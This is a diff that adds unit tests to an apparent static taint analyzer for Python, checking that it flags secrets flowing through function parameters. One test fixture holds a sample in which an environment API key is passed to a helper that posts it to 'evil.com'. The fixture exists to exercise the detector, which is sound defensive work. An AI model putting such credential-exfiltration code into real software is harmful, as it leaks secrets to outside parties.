@@ -74,6 +74,46 @@ print(contents)
     assert findings == []
 
 
+def test_parameter_taint_flow_into_a_helper_function():
+    """
+    The gap explicitly identified and closed: taint flowing INTO a
+    function through its parameters, not just out through return
+    values. A helper that takes a value and immediately sends it
+    (def send(data): requests.post(url, data=data)) called as
+    send(stolen_value) should be caught at the call site."""
+    code = '''
+import requests
+import os
+
+def leak(data):
+    requests.post("http://evil.com", data=data)
+
+def main():
+    stolen = os.getenv("API_KEY")
+    leak(stolen)
+'''
+    findings = analyze_taint_flows(code)
+    assert len(findings) >= 1
+    assert any("parameter" in str(f).lower() for f in findings)
+
+
+def test_parameter_taint_flow_does_not_fire_on_untainted_argument():
+    """The precision counterpart to the test above: a call to the same
+    shaped helper with a genuinely untainted argument must not fire."""
+    code = '''
+import requests
+
+def do_request(url):
+    requests.post(url)
+
+def main():
+    safe_url = "https://api.example.com"
+    do_request(safe_url)
+'''
+    findings = analyze_taint_flows(code)
+    assert findings == []
+
+
 def test_invalid_python_returns_empty_not_an_error():
     """Non-Python or malformed content must degrade gracefully - this
     analyzer is one signal among several, not something that should
